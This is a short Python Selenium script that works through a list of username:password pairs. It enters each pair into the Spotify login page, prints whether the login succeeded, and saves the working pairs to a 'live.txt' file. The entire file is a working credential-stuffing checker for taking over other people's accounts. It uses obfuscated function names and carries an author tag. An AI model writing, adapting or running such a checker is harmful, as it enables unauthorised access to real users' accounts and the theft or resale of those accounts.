from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time

parser = ":"
country = 'en'

def M3HD1K4MB(file_path):
    with open(file_path, 'r') as file:
        accounts = [line.strip().split(f'{parser}') for line in file.readlines()]
    return accounts

def M3HDIK4MB(username_str, password_str):
    try:
        chrome_options = Options()
        chrome_options.add_argument("--start-maximized")

        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)

        driver.get(f"https://accounts.spotify.com/{country}/login")

        username = driver.find_element(By.ID, "login-username")
        password = driver.find_element(By.ID, "login-password")

        username.send_keys(username_str)
        password.send_keys(password_str)

        login_button = driver.find_element(By.ID, "login-button")
        login_button.click()

        time.sleep(5)

        current_url = driver.current_url
        expected_url = f"https://accounts.spotify.com/{country}/login"

        if current_url == expected_url:
            print("github.com/mehdikamb")
            print(f"🔴 | {username_str}:{password_str}")
        else:
            print("github.com/mehdikamb")
            print(f"✅ | {username_str}:{password_str}")
            with open('live.txt', 'a') as livetxt:
                livetxt.write(f'{username_str}{parser}{password_str}\n')

    finally:
        pass

accounts = M3HD1K4MB('accounts.txt')
for username, password in accounts:
    M3HDIK4MB(username, password)
    time.sleep(1)